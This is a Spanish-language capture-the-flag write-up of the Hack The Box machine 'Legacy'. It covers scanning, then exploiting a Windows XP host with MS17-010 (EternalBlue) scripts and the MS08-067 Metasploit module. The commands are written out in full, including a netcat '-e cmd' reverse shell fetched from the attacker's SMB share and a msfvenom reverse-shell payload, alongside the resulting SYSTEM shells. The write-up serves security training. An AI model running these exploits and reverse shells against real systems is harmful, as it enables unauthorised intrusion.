---
layout: single
title: Legacy - Hack The Box
excerpt: "Una máquina no tan complicada, ya que vamos a utilizar un Exploit que ya hemos usado antes con la máquina Blue, la diferencia radica en los named pipes activos en el servicio Samba que está activo, hay varias manera de aprovecharnos de este, vamos a probar 3 diferentes.."
date: 2023-02-13
classes: wide
header:
  teaser: /assets/images/htb-writeup-legacy/legacy_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - HackTheBox
  - Easy Machine
tags:
  - Windows
  - Samba
  - SMB
  - Remote Command Execution (RCE) 
  - RCE - MS17-010
  - Eternal Blue
  - Microsoft Windows Server Code Execution - MS08-067
  - OSCP Style
  - Metasploit
---
![](/assets/images/htb-writeup-legacy/legacy_logo.png)
Una máquina no tan complicada, ya que vamos a utilizar un Exploit que ya hemos usado antes con la **máquina Blue**, la diferencia radica en los **named pipes** activos en el servicio **Samba** que está activo, hay varias manera de aprovecharnos de este, vamos a probar 3 diferentes.

**OJO**: Me apoye en la forma que S4vitar utilizo y HackerSploit usando Metasploit, aquí los links de los videos:
* https://www.youtube.com/watch?v=RuWkPH_Vecg
* https://www.youtube.com/watch?v=uV6WNOfP8s8

Les doy creditos a S4vitar pues andaba atorado en la forma de acceder a la maquina usando Eternal Blue y a HackerSploit por su forma de usar el exploit MS08-067 ya que cuando investigue los servicios de la maquina aparecio dicho exploit y abajo un video suyo.


<br>
<hr>
<div id="Indice">
	<h1>Índice</h1>
	<ul>
		<li><a href="#Recopilacion">Recopilación de Información</a></li>
			<ul>
				<li><a href="#Ping">Traza ICMP</a></li>
				<li><a href="#Puertos">Escaneo de Puertos</a></li>
				<li><a href="#Servicios">Escaneo de Servicios</a></li>
			</ul>
		<li><a href="#Analisis">Análisis de Vulnerabilidades</a></li>
			<ul>
				<li><a href="#Exploit">Buscando un Exploit</a></li>
			</ul>
		<li><a href="#Explotacion">Explotación de Vulnerabilidades</a></li>
			<ul>
				<li><a href="#Exploit2">Configurando y Usando un Exploit</a></li>
			</ul>
		<li><a href="#Otras">Otras Formas</a></li>
                        <ul>
                                <li><a href="#Metas">Exploit de Metasploit</a></li>
                                <li><a href="#Metas2">Usando Metasploit</a></li>
                        </ul>
		<li><a href="#Links">Links de Investigación</a></li>
	</ul>
</div>


<br>
<br>
<hr>
<div style="position: relative;">
 <h1 id="Recopilacion" style="text-align:center;">Recopilación de Información</h1>
  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>
<br>


<h2 id="Ping">Traza ICMP</h2>

Realizamos un ping hacia la máquina para ver si está conectada y con el TTL vemos que tipo SO ocupa.
```
ping -c 4 10.10.10.4         
PING 10.10.10.4 (10.10.10.4) 56(84) bytes of data.
64 bytes from 10.10.10.4: icmp_seq=1 ttl=127 time=131 ms
64 bytes from 10.10.10.4: icmp_seq=2 ttl=127 time=132 ms
64 bytes from 10.10.10.4: icmp_seq=3 ttl=127 time=131 ms
64 bytes from 10.10.10.4: icmp_seq=4 ttl=127 time=131 ms

--- 10.10.10.4 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3002ms
rtt min/avg/max/mdev = 131.009/131.220/131.604/0.227 ms
```
Gracias al TLL sabemos que es una máquina con Windows, ahora hagamos los escaneos.

<h2 id="Puertos">Escaneo de Puertos</h2>

```
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.4 -oG allPorts                         
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-13 13:53 CST
Initiating SYN Stealth Scan at 13:53
Scanning 10.10.10.4 [65535 ports]
Discovered open port 445/tcp on 10.10.10.4
Discovered open port 139/tcp on 10.10.10.4
Discovered open port 135/tcp on 10.10.10.4
Completed SYN Stealth Scan at 13:54, 23.60s elapsed (65535 total ports)
Nmap scan report for 10.10.10.4
Host is up, received user-set (0.44s latency).
Scanned at 2023-02-13 13:53:49 CST for 23s
Not shown: 36144 closed tcp ports (reset), 29388 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE      REASON
135/tcp open  msrpc        syn-ack ttl 127
139/tcp open  netbios-ssn  syn-ack ttl 127
445/tcp open  microsoft-ds syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 23.67 seconds
           Raw packets sent: 114947 (5.058MB) | Rcvd: 36606 (1.464MB)
```
* -p-: Para indicarle un escaneo en ciertos puertos.
* --open: Para indicar que aplique el escaneo en los puertos abiertos.
* -sS: Para indicar un TCP Syn Port Scan para que nos agilice el escaneo.
* --min-rate: Para indicar una cantidad de envió de paquetes de datos no menor a la que indiquemos (en nuestro caso pedimos 5000).
* -vvv: Para indicar un triple verbose, un verbose nos muestra lo que vaya obteniendo el escaneo.
* -n: Para indicar que no se aplique resolución dns para agilizar el escaneo.
* -Pn: Para indicar que se omita el descubrimiento de hosts.
* -oG: Para indicar que el output se guarde en un fichero grepeable. Lo nombre allPorts.

Solamente hay 3 puertos abiertos y ya conocidos, por lo que sabemos que la máquina está usando el servicio **Samba**. Aun así, hagamos el escaneo de servicios.

<h2 id="Servicios">Escaneo de Servicios</h2>

```
nmap -sC -sV -p135,139,445 10.10.10.4 -oN targeted                                             
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-13 13:57 CST
Nmap scan report for 10.10.10.4
Host is up (0.13s latency).

PORT    STATE SERVICE      VERSION
135/tcp open  msrpc        Microsoft Windows RPC
139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds Windows XP microsoft-ds
Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: mean: 5d00h27m40s, deviation: 2h07m16s, median: 4d22h57m40s
|_nbstat: NetBIOS name: LEGACY, NetBIOS user: <unknown>, NetBIOS MAC: 005056b995fd (VMware)
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
|   OS CPE: cpe:/o:microsoft:windows_xp::-
|   Computer name: legacy
|   NetBIOS computer name: LEGACY\x00
|   Workgroup: HTB\x00
|_  System time: 2023-04-02T00:55:16+03:00

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.12 seconds
```
* -sC: Para indicar un lanzamiento de scripts básicos de reconocimiento.
* -sV: Para identificar los servicios/versión que están activos en los puertos que se analicen.
* -p: Para indicar puertos específicos.
* -oN: Para indicar que el output se guarde en un fichero. Lo llame targeted.

Al parecer, podemos conectarnos al servicio **Samba** como usuarios sin autenticación. Vamos a tratar de listar los recursos compartidos, a ver si nos deja.
```
smbclient -L 10.10.10.4 -N 
session setup failed: NT_STATUS_INVALID_PARAMETER
```
No pues no, entonces es momento de investigar por internet un Exploit que nos sirva.


<br>
<br>
<hr>
<div style="position: relative;">
 <h1 id="Analisis" style="text-align:center;">Análisis de Vulnerabilidades</h1>
  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>
<br>


<h2 id="Exploit">Buscando un Exploit</h2>

De acuerdo al escaneo de servicios, tenemos dos para buscar, aunque empecemos mejor por el servicio del puerto 445 y luego el puerto 139.

Investigando los dos, saltan a relusir dos Exploits:
* MS08-067
* MS17-010

Que si no mal recuerdo, el **MS17-010** es el **Eternal Blue**. El otro que encontramos lo utiliza Metasploit así que vamos a probar primero con el **Eternal Blue**.
```
searchsploit MS17-010               
----------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                             |  Path
----------------------------------------------------------------------------------------------------------- ---------------------------------
Microsoft Windows - 'EternalRomance'/'EternalSynergy'/'EternalChampion' SMB Remote Code Execution (Metaspl | windows/remote/43970.rb
Microsoft Windows - SMB Remote Code Execution Scanner (MS17-010) (Metasploit)                              | windows/dos/41891.rb
Microsoft Windows 7/2008 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)                           | windows/remote/42031.py
Microsoft Windows 7/8.1/2008 R2/2012 R2/2016 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)       | windows/remote/42315.py
Microsoft Windows 8/8.1/2012 R2 (x64) - 'EternalBlue' SMB Remote Code Execution (MS17-010)                 | windows_x86-64/remote/42030.py
Microsoft Windows Server 2008 R2 (x64) - 'SrvOs2FeaToNt' SMB Remote Code Execution (MS17-010)              | windows_x86-64/remote/41987.py
----------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```
Vamos a analizar este Exploit: **Microsoft Windows 7/2008 R2 - 'EternalBlue' SMB Remote Code Execution (MS17-010)** pues usa **Samba** para la ejecución de código remoto, veamos que se cuece ahí.

Después de analizarlo, no creo que nos vaya a servir porque dicho Exploit solo sirve para Windows 7 y 2008, y al parecer la máquina que estamos haciendo usa Windows XP. Entonces vamos a buscar un Exploit en internet sobre el **MS17-010**.

¡WUALA! Aparece el GitHub que uso el tito S4vitar y que fue uno de los que probe después en la máquina Blue, vamos a probarlo aquí para que vean cómo funciona.


<br>
<br>
<hr>
<div style="position: relative;">
 <h1 id="Explotacion" style="text-align:center;">Explotación de Vulnerabilidades</h1>
  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>
<br>


<h2 id="Exploit2">Configurando y Usando un Exploit</h2>

Vamonos por pasos:
* Descargamos el GitHub: https://github.com/worawit/MS17-010
```
git clone https://github.com/worawit/MS17-010       
Clonando en 'MS17-010'...
remote: Enumerating objects: 183, done.
remote: Total 183 (delta 0), reused 0 (delta 0), pack-reused 183
Recibiendo objetos: 100% (183/183), 113.61 KiB | 908.00 KiB/s, listo.
Resolviendo deltas: 100% (102/102), listo.
```
* Entramos al directorio y vemos que hay dentro:
```
ls
BUG.txt                  eternalblue_poc.py       eternalromance_leak.py  eternalsynergy_poc.py  README.md
checker.py               eternalchampion_leak.py  eternalromance_poc2.py  infoleak_uninit.py     shellcode
eternalblue_exploit7.py  eternalchampion_poc2.py  eternalromance_poc.py   mysmb.py               zzz_exploit.py
eternalblue_exploit8.py  eternalchampion_poc.py   eternalsynergy_leak.py  npp_control.p
```
* Si vemos el Readme del GitHub, hay 2 scripts que nos pueden ayudar:
  * checker.py
  * zzz_exploit.py

Porque el checker va a buscar un acceso a los **named pipes** y el **zzz_exploit** sirve en servicios Windows del 2000 para arriba. Ahora vamos a usar primero el checker.

OJO: para usar el checker, hay que usar Python 2, porque usando Python 3 o Python no funciona:
```
python2 checker.py 10.10.10.4
Target OS: Windows 5.1
The target is not patched

=== Testing named pipes ===
spoolss: Ok (32 bit)
samr: STATUS_ACCESS_DENIED
netlogon: STATUS_ACCESS_DENIED
lsarpc: STATUS_ACCESS_DENIED
browser: Ok (32 bit)
```
Ya vimos 2 **named pipes** con **OK**, lo que quiere decir que son vulnerables y el zzz_exploit usara para ganar acceso a la página. Es momento de analizar el Exploit:

```
USERNAME = ''
PASSWORD = ''

smb_send_file(smbConn, sys.argv[0], 'C', '/exploit.py')
        service_exec(conn, r'cmd /c copy c:\pwned.txt c:\pwned_exec.txt')
```
Nos pide 2 parámetros, los cuales no tenemos de momento y están esos 2 códigos que estan en la funcion **smb_pwn**. Entonces es similar este Exploit al que usamos en la máquina Blue. Aquí la desventaja es que no nos podemos loguear en el servicio **Samba** por lo que hacer un **.exe** como en la máquina Blue es una pérdida de tiempo, lo que podemos probar es si con **spoolss** o browser podemos inyectar código.

Pero, ¿qué es spoolss y browser?

**Spoolsv.exe es el servidor de API del administrador de colas. Se implementa como un servicio Windows 2000 (o posterior) que se inicia cuando se inicia el sistema operativo. Este módulo exporta una interfaz RPC al lado servidor de la API win32 del administrador de colas.**

**Browser es un acceso por red al servidor de Windows**

Entonces sería mejor probar por el Browser para ver si se puede inyectar código, intentemos lanzar una Traza ICMP:

```
service_exec(conn, r'cmd /c ping Tu_IP')
```
Levantamos un servidor con **tcpdump** para que capture la traza:
```
tcpdump -i tun0 icmp -n
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
```
Probamos el Exploit:
```
python2 zzz_exploit.py 10.10.10.4 browser
Target OS: Windows 5.1
Groom packets
attempt controlling next transaction on x86
success controlling one transaction
modify parameter count to 0xffffffff to be able to write backward
leak next transaction
CONNECTION: 0x86466990
SESSION: 0xe1599948
FLINK: 0x7bd48
InData: 0x7ae28
MID: 0xa
TRANS1: 0x78b50
TRANS2: 0x7ac90
modify transaction struct for arbitrary read/write
make this SMB session to be SYSTEM
...
```
Vaya, vaya, entonces si es vulnerable, vamos a intentar subir una netcat por ahí para tratar de conectarnos de manera remota a la máquina. Vamos por pasos:

* Busquemos una netcat, si estas en kali y ahí hay una, solo tiene que buscarla con el comando **locate** y copiarla donde la vayas a ocupar:

```
locate nc.exe 
/usr/share/seclists/Web-Shells/FuzzDB/nc.exe
/usr/share/windows-resources/binaries/nc.exe
cp /usr/share/windows-resources/binaries/nc.exe .
ls           
BUG.txt                  eternalblue_exploit8.py  eternalchampion_poc.py  eternalsynergy_leak.py  mysmb.pyc       README.md
checker.py               eternalblue_poc.py       eternalromance_leak.py  eternalsynergy_poc.py   nc.exe          shellcode
eternal-blue.exe         eternalchampion_leak.py  eternalromance_poc2.py  infoleak_uninit.py      npp_control.py  zzz_exploit.py
eternalblue_exploit7.py  eternalchampion_poc2.py  eternalromance_poc.py   mysmb.py                __pycache__
```
* Ahora dentro del Exploits vamos a indicar lo siguiente:
```
service_exec(conn, r'cmd /c \\Tu_IP\smbFolder\nc.exe -e cmd Tu_IP Cualquier_Puerto')
```
Esto lo que hará será descargar la netcat de un servidor de **smb** creado con **impacket** y que se alzará en la carpeta en donde tengamos la **nc.exe**.

* Ahora vamos a alzar dicho servidor:
```
smbserver.py smbFolder $(pwd)
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```
* Una vez alzado, activamos una netcat aparte:
```
nc -nvlp 443           
listening on [any] 443 ...
```
* Por último activamos el Exploit y listo:
```
c -nvlp 443           
listening on [any] 443 ...
connect to [10.10.14.9] from (UNKNOWN) [10.10.10.4] 1037
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.
C:\WINDOWS\system32>whoami
whoami
'whoami' is not recognized as an internal or external command,
operable program or batch file.
```

Quizá aquí no lo mencione, pero gracias al **Eternal Blue** entramos directamente como Root o en este caso como **Authority System**. 
* Ya solo buscamos las flags y ya tendríamos lista esta máquina:
```
C:\WINDOWS\system32>cd C:\
cd C:\
C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B
 Directory of C:\
16/03/2017  08:30 ��                 0 AUTOEXEC.BAT
16/03/2017  08:30 ��                 0 CONFIG.SYS
16/03/2017  09:07 ��    <DIR>          Documents and Settings
29/12/2017  11:41 ��    <DIR>          Program Files
02/04/2023  02:43 ��                 0 pwned.txt
18/05/2022  03:10 ��    <DIR>          WINDOWS
               3 File(s)              0 bytes
               3 Dir(s)   6.403.969.024 bytes free
C:\>cd "Documents and Settings"
cd "Documents and Settings"
C:\Documents and Settings>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B
 Directory of C:\Documents and Settings
16/03/2017  09:07 ��    <DIR>          .
16/03/2017  09:07 ��    <DIR>          ..
16/03/2017  09:07 ��    <DIR>          Administrator
16/03/2017  08:29 ��    <DIR>          All Users
16/03/2017  08:33 ��    <DIR>          john
               0 File(s)              0 bytes
               5 Dir(s)   6.403.964.928 bytes free
```
Las flags están en **John** y **Administrator**

**NOTA**

Para saber qué clase de vulnerabilidades tiene la máquina también pudimos usar el siguiente script de nmap:
```
nmap --script "vuln and safe" -p445 10.10.10.4
```
Y este nos mostraba que la máquina era vulnerable al **Eternal Blue**, no lo recordaba e incluso lo tengo anotado en la solución de la maquina Blue jeje.


<br>
<br>
<hr>
<div style="position: relative;">
 <h1 id="Otras" style="text-align:center;">Otras Formas</h1>
  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>
<br>


Bueno, existen otras dos formas de poder ganar acceso a esta máquina, una será usando el Exploit de Metasploit y la otra será usando Metasploit en sí, así que vamos a probar con el Exploit de Metasploit.

<h2 id="Metas">Exploit de Metasploit</h2>

Esta forma la encontré usando el método que se usó en el siguiente link: 

* https://ivanitlearning.wordpress.com/2019/02/24/exploiting-ms17-010-without-metasploit-win-xp-sp3/

Vamos a descargar el siguiente repositorio: 

* https://github.com/helviojunior/MS17-010

Este que contiene una variante del zzz_exploit.py que por así decirlo nos automatiza un poco el proceso, pues ya solo tendríamos que comentar un par de líneas y debemos hacer un Payload con msfvenom como en la máquina Blue.
```
git clone https://github.com/helviojunior/MS17-010.git
Clonando en 'MS17-010'...
remote: Enumerating objects: 202, done.
remote: Total 202 (delta 0), reused 0 (delta 0), pack-reused 202
Recibiendo objetos: 100% (202/202), 118.50 KiB | 905.00 KiB/s, listo.
Resolviendo deltas: 100% (115/115), listo.

ls
BUG.txt                  eternalblue_poc.py       eternalromance_leak.py  eternalsynergy_poc.py  npp_control.py       zzz_exploit.py
checker.py               eternalchampion_leak.py  eternalromance_poc2.py  infoleak_uninit.py     README.md
eternalblue_exploit7.py  eternalchampion_poc2.py  eternalromance_poc.py   mysmb.py               send_and_execute.py
eternalblue_exploit8.py  eternalchampion_poc.py   eternalsynergy_leak.py  mysmb.pyc              shellcode
```
La variante se llama **send_and_execute** y vamos a modificar la función **send_and_execute** con lo siguiente:
```
smb_send_file(smbConn, lfile, 'C', '/windows/temp/%s' % filename)
        service_exec(conn, r'cmd /c c:\windows\temp\%s' % filename)
```
Comentamos esas dos líneas agregando un **#** y agregamos paréntesis al print que está arriba:
```
filename = "%s.exe" % random_generator(6)
        print ("Sending file %s..." % filename)
```
Muy bien, ahora hagamos el Payload con msfvenom:
```
msfvenom -p windows/shell_reverse_tcp -f exe LHOST=10.10.14.9 LPORT=443 -o Eternal_Blue.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
Saved as: Eternal_Blue.exe
```
Si bien esta es una forma, también podemos especificar lo que no pusimos que es la plataforma y la arquitectura así:
```
msfvenom -p windows/shell_reverse_tcp -f exe LHOST=10.10.14.9 LPORT=443 EXITFUNC=thread -a x86 --platform windows -o Eternal_Blue.exe
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
Saved as: Eternal_Blue.exe
```
Ya con esto tenemos todo preparado, ya solo activamos una netcat antes del final:
```
nc -nvlp 443
listening on [any] 443 ...
```
Y activamos el Exploit:
```
python2 send_and_execute.py 10.10.10.4 Eternal_Blue.exe                                    
Trying to connect to 10.10.10.4:445
Target OS: Windows 5.1
Using named pipe: browser
Groom packets
attempt controlling next transaction on x86
success controlling one transaction
modify parameter count to 0xffffffff to be able to write backward
leak next transaction
CONNECTION: 0x86059da8
SESSION: 0xe228e3e8
...
```
Vemos la netcat y ya estamos dentro:
```
nc -nvlp 443
listening on [any] 443 ...
connect to [10.10.14.9] from (UNKNOWN) [10.10.10.4] 1038
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>whoami
whoami
'whoami' is not recognized as an internal or external command,
operable program or batch file.

C:\WINDOWS\system32>cd C:\
cd C:\

C:\>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 54BF-723B

 Directory of C:\

16/03/2017  08:30 ��                 0 AUTOEXEC.BAT
16/03/2017  08:30 ��                 0 CONFIG.SYS
16/03/2017  09:07 ��    <DIR>          Documents and Settings
02/04/2023  03:11 ��            73.802 ETYX3D.exe
29/12/2017  11:41 ��    <DIR>          Program Files
02/04/2023  02:43 ��                 0 pwned.txt
18/05/2022  03:10 ��    <DIR>          WINDOWS
               4 File(s)         73.802 bytes
               3 Dir(s)   6.403.895.296 bytes free
```
OJO: aquí lo que hace es cargar el archivo **ETYX3D.exe**, dicho archivo es el que se crea en la función **send_and_execute**, así que este es el que entiendo hace la conexión hacia nuestra netcat.

<h2 id="Metas2">Usando Metasploit</h2>

Como había mencionado antes, había encontrado el **MS08-062**, bueno este se encuentra en Metasploit y se puede usar. Vamos a activar el Metasploit:
```
msfdb start                                                                                
[+] Starting database
msfconsole
                                                  
                                              `:oDFo:`                            
                                           ./ymM0dayMmy/.                                                                                            
                                        -+dHJ5aGFyZGVyIQ==+-                                                                                         
                                    `:sm⏣~~Destroy.No.Data~~s:`                                                                                      
                                 -+h2~~Maintain.No.Persistence~~h+-                                                                                  
                             `:odNo2~~Above.All.Else.Do.No.Harm~~Ndo:`                                                                               
                          ./etc/shadow.0days-Data'%20OR%201=1--.No.0MN8'/.                                                                           
                       -++SecKCoin++e.AMd`       `.-://///+hbove.913.ElsMNh+-                                                                        
                      -~/.ssh/id_rsa.Des-                  `htN01UserWroteMe!-                                                                       
                      :dopeAW.No<nano>o                     :is:TЯiKC.sudo-.A:                                                                       
                      :we're.all.alike'`                     The.PFYroy.No.D7:                                                                       
                      :PLACEDRINKHERE!:                      yxp_cmdshell.Ab0:                                                                       
                      :msf>exploit -j.                       :Ns.BOB&ALICEes7:                                                                       
                      :---srwxrwx:-.`                        `MS146.52.No.Per:                                                                       
                      :<script>.Ac816/                        sENbove3101.404:                                                                       
                      :NT_AUTHORITY.Do                        `T:/shSYSTEM-.N:                                                                       
                      :09.14.2011.raid                       /STFU|wall.No.Pr:                                                                       
                      :hevnsntSurb025N.                      dNVRGOING2GIVUUP:                                                                       
                      :#OUTHOUSE-  -s:                       /corykennedyData:                                                                       
                      :$nmap -oS                              SSo.6178306Ence:                                                                       
                      :Awsm.da:                            /shMTl#beats3o.No.:                                                                       
                      :Ring0:                             `dDestRoyREXKC3ta/M:                                                                       
                      :23d:                               sSETEC.ASTRONOMYist:                                                                       
                       /-                        /yo-    .ence.N:(){ :|: & };:                                                                       
                                                 `:Shall.We.Play.A.Game?tron/                                                                        
                                                 ```-ooy.if1ghtf0r+ehUser5`                                                                          
                                               ..th3.H1V3.U2VjRFNN.jMh+.`                                                                            
                                              `MjM~~WE.ARE.se~~MMjMs                                                                                 
                                               +~KANSAS.CITY's~-`                                                                                    
                                                J~HAKCERS~./.`                                                                                       
                                                .esc:wq!:`                                                                                           
                                                 +++ATH`                                                                                             
                                                  `                                                                                                  
                                                                                                                                                     

       =[ metasploit v6.3.4-dev                           ]
+ -- --=[ 2294 exploits - 1201 auxiliary - 409 post       ]
+ -- --=[ 968 payloads - 45 encoders - 11 nops            ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Enable verbose logging with set VERBOSE 
true                                                                                                                                                 
Metasploit Documentation: https://docs.metasploit.com/
```
Buscamos el Exploit:
```
msf6 > search MS08-067

Matching Modules
================

   #  Name                                 Disclosure Date  Rank   Check  Description
   -  ----                                 ---------------  ----   -----  -----------
   0  exploit/windows/smb/ms08_067_netapi  2008-10-28       great  Yes    MS08-067 Microsoft Server Service Relative Path Stack Corruption


Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/smb/ms08_067_netapi
```
Usamos el Exploit:
```
msf6 > use exploit/windows/smb/ms08_067_netapi
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
```
Y le pedimos que nos muestre las opciones:
```
msf6 exploit(windows/smb/ms08_067_netapi) > show options

Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT    445              yes       The SMB service port (TCP)
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.0.2.15        yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Targeting
```
Justo ahí indica que usara el **named pipe Browser**, ya solo es cosa de darle el RHOSTS y el LHOST:
```
msf6 exploit(windows/smb/ms08_067_netapi) > set RHOSTS 10.10.10.4
RHOSTS => 10.10.10.4
msf6 exploit(windows/smb/ms08_067_netapi) > set LHOST 10.10.14.9
LHOST => 10.10.14.9
```
Iniciamos el Exploit y listo:
```
msf6 exploit(windows/smb/ms08_067_netapi) > exploit

[*] Started reverse TCP handler on 10.10.14.9:4444 
[*] 10.10.10.4:445 - Automatically detecting the target...
[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
[*] Sending stage (175686 bytes) to 10.10.10.4
[*] Meterpreter session 1 opened (10.10.14.9:4444 -> 10.10.10.4:1040) at 2023-03-27 16:53:43 -0600
meterpreter > sysinfo
Computer        : LEGACY
OS              : Windows XP (5.1 Build 2600, Service Pack 3).
Architecture    : x86
System Language : en_US
Domain          : HTB
Logged On Users : 1
Meterpreter     : x86/windows
meterpreter > pwd
C:\WINDOWS\system32
```
Solo es cosa de buscar los mismos directorios donde están las flags y otra vez vulneramos la máquina:
```
meterpreter > cd C:\\
meterpreter > ls
Listing: C:\
============

Mode              Size    Type  Last modified              Name
----              ----    ----  -------------              ----
100777/rwxrwxrwx  0       fil   2017-03-15 23:30:44 -0600  AUTOEXEC.BAT
100666/rw-rw-rw-  0       fil   2017-03-15 23:30:44 -0600  CONFIG.SYS
040777/rwxrwxrwx  0       dir   2017-03-16 00:07:20 -0600  Documents and Settings
100777/rwxrwxrwx  73802   fil   2023-04-01 18:11:58 -0600  ETYX3D.exe
100444/r--r--r--  0       fil   2017-03-15 23:30:44 -0600  IO.SYS
100444/r--r--r--  0       fil   2017-03-15 23:30:44 -0600  MSDOS.SYS
100555/r-xr-xr-x  47564   fil   2008-04-13 15:13:04 -0500  NTDETECT.COM
040555/r-xr-xr-x  0       dir   2017-12-29 14:41:18 -0600  Program Files
040777/rwxrwxrwx  0       dir   2017-03-15 23:32:59 -0600  System Volume Information
040777/rwxrwxrwx  0       dir   2022-05-18 07:10:06 -0500  WINDOWS
100777/rwxrwxrwx  73802   fil   2023-04-01 18:21:25 -0600  Y8YP5L.exe
100666/rw-rw-rw-  211     fil   2017-03-15 23:26:58 -0600  boot.ini
100444/r--r--r--  250048  fil   2008-04-13 17:01:44 -0500  ntldr
000000/---------  0       fif   1969-12-31 18:00:00 -0600  pagefile.sys
100666/rw-rw-rw-  0       fil   2023-04-01 17:43:46 -0600  pwned.txt

meterpreter > cd "Documents and Settings"
meterpreter > ls
Listing: C:\Documents and Settings
==================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040777/rwxrwxrwx  0     dir   2017-03-16 00:07:21 -0600  Administrator
040777/rwxrwxrwx  0     dir   2017-03-15 23:29:48 -0600  All Users
040777/rwxrwxrwx  0     dir   2017-03-15 23:33:37 -0600  Default User
040777/rwxrwxrwx  0     dir   2017-03-15 23:32:52 -0600  LocalService
040777/rwxrwxrwx  0     dir   2017-03-15 23:32:43 -0600  NetworkService
040777/rwxrwxrwx  0     dir   2017-03-15 23:33:42 -0600  john
```
Bien podríamos probar los Exploits del **Eternal Blue** que son exclusivos de Metasploit, por lo que pueden intentarlo solamente chequen que cumpla con los requisitos, que en este caso es que se trate de conectar por el **named pipe Browser**.


<br>
<br>
<div style="position: relative;">
 <h2 id="Links" style="text-align:center;">Links de Investigación</h2>
  <button style="position:absolute; left:80%; top:3%; background-color:#444444; border-radius:10px; border:none; padding:4px;6px; font-size:0.80rem;">
   <a href="#Indice">Volver al Índice</a>
  </button>
</div>

* https://www.getastra.com/blog/security-audit/how-to-hack-windows-xp-using-metasploit-kali-linux-ms08067/
* https://github.com/EEsshq/CVE-2017-0144---EtneralBlue-MS17-010-Remote-Code-Execution
* https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
* https://github.com/worawit/MS17-010
* https://ivanitlearning.wordpress.com/2019/02/24/exploiting-ms17-010-without-metasploit-win-xp-sp3/
* https://github.com/helviojunior/MS17-010
* https://www.google.com/search?q=named+pipe+browser&client=firefox-b-e&ei=3gciZLTqDYbCkPIPt9y5uAY&oq=named+pipes+browser&gs_lcp=Cgxnd3Mtd2l6L>
* https://www.youtube.com/watch?v=RuWkPH_Vecg
* https://www.youtube.com/watch?v=uV6WNOfP8s8

<br>
# FIN
